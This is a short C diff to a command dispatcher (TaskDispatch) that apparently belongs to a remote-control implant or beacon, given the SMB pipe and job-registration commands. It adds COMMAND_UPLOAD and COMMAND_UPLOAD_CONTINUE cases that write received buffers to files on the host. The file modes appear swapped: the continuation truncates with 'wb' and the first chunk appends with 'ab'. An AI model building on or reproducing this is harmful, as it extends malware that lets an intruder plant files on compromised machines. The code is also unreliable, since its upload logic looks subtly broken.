@@ -94,6 +94,12 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_PIPE_OPEN_EXPLICIT:
 			ProtocolSmbOpenExplicit(buffer);
 			break;
+		case COMMAND_UPLOAD_CONTINUE:
+			Upload(buffer, size, "wb");
+			break;
+		case COMMAND_UPLOAD:
+			Upload(buffer, size, "ab");
+			break;
 		case COMMAND_JOB_REGISTER:
 			JobRegister(buffer, size, FALSE, FALSE);
 			break;
